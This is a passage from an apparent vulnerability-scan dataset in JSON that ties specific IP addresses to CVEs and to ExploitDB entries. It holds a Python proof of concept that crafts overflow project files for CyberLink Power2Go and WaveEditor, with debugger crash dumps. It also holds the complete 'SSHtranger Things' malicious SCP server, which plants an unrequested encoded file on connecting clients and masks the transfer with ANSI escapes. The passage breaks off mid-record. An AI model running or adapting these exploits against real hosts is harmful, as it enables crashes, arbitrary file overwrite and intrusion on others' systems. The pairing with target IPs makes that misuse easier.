74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x41\\x75\\x74\\x6f\\x53\\x70\\x6c\\x69\\x74\\x44\\x69\\x73\\x63\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x69\\x73\\x63\"\r\n\t\"\\x53\\x70\\x6c\\x69\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\"\r\n\t\"\\x0d\\x0a\\x41\\x75\\x74\\x6f\\x4f\\x76\\x65\\x72\\x42\\x75\\x72\\x6e\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x61\\x74\"\r\n\t\"\\x61\\x50\\x72\\x6a\\x74\\x6f\\x56\\x69\\x64\\x65\\x6f\\x50\\x72\\x6a\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x73\\x69\\x6d\"\r\n\t\"\\x75\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\\x66\\x3d\"\r\n\t\"\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6c\\x6f\\x73\\x65\"\r\n\t\"\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x76\\x65\\x72\\x69\\x66\\x79\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x65\\x66\\x65\\x63\\x74\"\r\n\t\"\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\"\r\n\t\"\\x22\\x31\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\"\r\n\t\"\\x64\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x63\\x64\\x54\\x65\\x78\\x74\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\"\r\n\t\"\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\\x69\\x6f\\x47\"\r\n\t\"\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\\x22\\x20\\x0d\\x0a\\x46\"\r\n\t\"\\x69\\x6c\\x65\\x53\\x79\\x73\\x74\\x65\\x6d\\x3d\\x22\\x49\\x53\\x4f\"\r\n\t\"\\x39\\x36\\x36\\x30\\x5f\\x4a\\x4f\\x4c\\x49\\x45\\x54\\x22\\x3e\")\r\n\r\n\tbody = (\r\n\t\"\\x73\\x72\\x63\\x3d\\x22\\x43\\x3a\\x5c\\x61\\x62\\x63\\x2e\\x74\\x78\"\r\n\t\"\\x74\\x22\\x20\\x0d\\x0a\\x6f\\x70\\x65\\x72\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3d\\x22\\x61\\x64\\x64\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x73\"\r\n\t\"\\x74\\x61\\x74\\x75\\x73\\x3d\\x22\\x6e\\x6f\\x74\\x62\\x75\\x72\\x6e\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x73\\x69\\x7a\\x65\\x3d\\x22\\x32\\x39\\x32\\x38\"\r\n\t\"\\x36\\x34\\x22\\x20\\x0d\\x0a\\x53\\x68\\x6f\\x77\\x53\\x69\\x7a\\x65\"\r\n\t\"\\x3d\\x22\\x32\\x39\\x32\\x38\\x36\\x34\\x22\\x20\\x0d\\x0a\\x41\\x6c\"\r\n\t\"\\x6c\\x6f\\x77\\x45\\x6e\\x63\\x72\\x79\\x70\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\"\r\n\t\"\\x52\\x6f\\x6f\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\\x22\\x31\\x32\\x39\"\r\n\t\"\\x33\\x36\\x37\\x33\\x34\\x31\\x35\\x30\\x39\\x37\\x33\\x36\\x38\\x37\"\r\n\t\"\\x34\\x22\\x20\\x0d\\x0a\\x6f\\x6c\\x64\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\\x66\\x69\\x6c\\x65\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\"\r\n\t\"\\x64\\x69\\x72\\x6c\\x65\\x76\\x65\\x6c\\x3d\\x22\\x30\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x6f\\x72\\x61\\x75\\x64\\x69\\x6f\\x74\\x72\\x61\\x63\\x6b\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x61\\x72\"\r\n\t\"\\x67\\x65\\x74\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x61\\x74\\x61\\x69\\x74\\x65\"\r\n\t\"\\x6d\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x6d\\x76\"\r\n\t\"\\x70\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x61\\x75\\x64\\x69\\x6f\\x53\"\r\n\t\"\\x75\\x62\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x2f\\x3e\\x0d\\x0a\"\r\n\t\"\\x3c\\x2f\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\\x3e\\x0d\\x0a\\x3c\"\r\n\t\"\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x0d\"\r\n\t\"\\x0a\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\r\n\tpgfile = \"overflow.p2g\"\r\n\tf = open(pgfile,'w')\r\n\tjunk = \"A\" * 778\r\n\tnseh = \"\\x42\\x42\"\r\n\tseh = \"\\x43\\x43\"\r\n\tsisa =  \"\\x44\" * 4200\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\" + \"\\r\\n\"\t# <File\r\n\thell+= \"name=\" + '\"'+ junk+nseh+seh+sisa + '\"'\r\n\ttry:\r\n\t\tf.write(header+ \"\\r\\n\" + hell + \"\\r\\n\" + body)\r\n\t\tprint \"[!] Generating\", pgfile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", pgfile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+pgfile+\"\\' \" + \"with CyberLink Power2Go.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\ndef waveeditor():\r\n\theader = (\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x41\\x70\\x70\\x6c\\x69\\x63\\x61\"\r\n\t\"\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x57\\x61\\x76\\x65\\x45\\x64\\x69\\x74\\x6f\\x72\\x22\\x20\"\r\n\t\"\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x32\\x2e\\x30\\x22\\x3e\")\r\n\r\n\twvefile = \"overflow.wve\"\r\n\tf = open(wvefile,'w')\r\n\tjunk = \"A\" * 3000\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\\x20\\x53\\x72\\x63\\x3d\" # <File src=\r\n\thell += '\"'+ junk + '\"' + \"\\x3e\"\r\n\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3e\\x3c\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x20\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\"\r\n\t\"\\x66\\x3d\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\\x64\\x3d\\x22\\x30\\x22\\x20\\x41\\x75\"\r\n\t\"\\x64\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x41\\x75\\x64\\x69\\x6f\\x47\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\"\r\n\t\"\\x22\\x2f\\x3e\\x3c\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x3c\"\r\n\t\"\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\ttry:\r\n\t\tf.write(header+hell+fill)\r\n\t\tprint \"[!] Generating\", wvefile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", wvefile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+wvefile+\"\\' \" + \"with CyberLink WaveEditor.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\nprint \"[*] CyberLink Multiple Products File Project Processing Stack Buffer Overflow POC.\"\r\nprint \"[*] by modpr0be <modpr0be[at]spentera[dot]com> | @modpr0be\"\r\nprint \"\\t1.CyberLink Power2Go <= 8.0\"\r\nprint \"\\t2.CyberLink WaveEditor <= 2.0\"\r\n\r\na = 0\r\nwhile a < 2:\r\n\ta = a + 1\r\n\top = input (\"[!] Choose the product: \")\r\n\tif op == 1:\r\n\t\tpower2go()\r\n\t\tsys.exit()\r\n\telif op == 2:\r\n\t\twaveeditor()\r\n\t\tsys.exit()\r\n\telse:\r\n\t\tprint \"[-] Oh plz.. pick the right one :)\\r\\n\"\r\n\r\n\r\n### DUMP OF POWER2GO\r\n#(d18.c60): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=07d4ffcc ebp=07d4fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:022> g\r\n#(d18.d40): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=ec8b55ff ebx=010358b0 ecx=78ad8951 edx=005b12fc esi=00430043 edi=0012d69c\r\n#eip=ec8b55ff esp=0012ca70 ebp=00000000 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\n#ec8b55ff ??              ???\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\Power2Go8\\Power2Go8.exe - \r\n#0:000> !exchain\r\n#0012ca9c: Power2Go8!CCLAuMixerAPI::operator=+156ba8 (00560dc8)\r\n#0012d104: Power2Go8!CCLAuMixerAPI::operator=+25e23 (00430043)\r\n#Invalid exception stack at 00420042\r\n#0:000> d 0012d104\r\n#0012d104  42 00 42 00 43 00 43 00-43 00 43 00 43 00 43 00  B.B.C.C.C.C.C.C.\r\n#0012d114  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d124  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d134  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d144  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d154  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d164  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d174  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n\r\n\r\n### DUMP OF WAVE EDITOR\r\n#(e44.734): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=00e5ffcc ebp=00e5fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:016> g\r\n#(e44.e48): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=00410041 ebx=ffffffff ecx=0240868b edx=420b1802 esi=022ccbe8 edi=00d2f848\r\n#eip=024c47af esp=0012c424 ebp=0012c42c iopl=0         nv up ei pl nz na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveKernel.dll -\r\n#WaveKernel!ReleaseWaveKernelClient+0x12a8f:\r\n#024c47af 8b4208          mov     eax,dword ptr [edx+8] ds:0023:420b180a=????????\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:000> !exchain\r\n#0012c898: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveEditor.exe -\r\n#WaveEditor!CCLAuMixerAPI::CCLAuMixerAPI+da61 (00410041)\r\n#Invalid exception stack at 00410041\r\n#0:000> d 0012c898\r\n#0012c898  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c908  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#",
                "description": "CyberLink (Multiple Products) - File Project Handling Stack Buffer Overflow (PoC)",
                "author": "modpr0be",
                "_id": 18220,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-09T00:00:00+00:00",
                "cve": [],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.14.72.188": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.14.73.60": {
        "CVE-2019-6111": [
            {
                "source": "CVE",
                "_id": "2019-7283",
                "description": "An issue was discovered in rcp in NetKit through 0.17. For an rcp operation, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned. A malicious rsh server (or Man-in-The-Middle attacker) can overwrite arbitrary files in a directory on the rcp client machine. This is similar to CVE-2019-6111.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-7283"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-6111",
                "description": "An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the scp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the scp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file).",
                "osvdb": [],
                "bid": [
                    106741
                ],
                "cve": [
                    "CVE-2019-6111"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-25017",
                "description": "An issue was discovered in rcp in MIT krb5-appl through 1.0.3. Due to the rcp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious rcp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the rcp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file). This issue is similar to CVE-2019-6111 and CVE-2019-7283. NOTE: MIT krb5-appl is not supported upstream but is shipped by a few Linux distributions. The affected code was removed from the supported MIT Kerberos 5 (aka krb5) product many years ago, at version 1.8.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-25017"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: SSHtranger Things\r\n# Date: 2019-01-17\r\n# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>\r\n# Vendor Homepage: https://www.openssh.com/\r\n# Software Link: [download link if available]\r\n# Version: OpenSSH 7.6p1\r\n# Tested on: Ubuntu 18.04.1 LTS\r\n# CVE : CVE-2019-6111, CVE-2019-6110\r\n\r\n'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "SCP Client - Multiple Vulnerabilities (SSHtranger Things)",
                "author": "Mark E. Haase",
                "_id": 46193,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-18T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    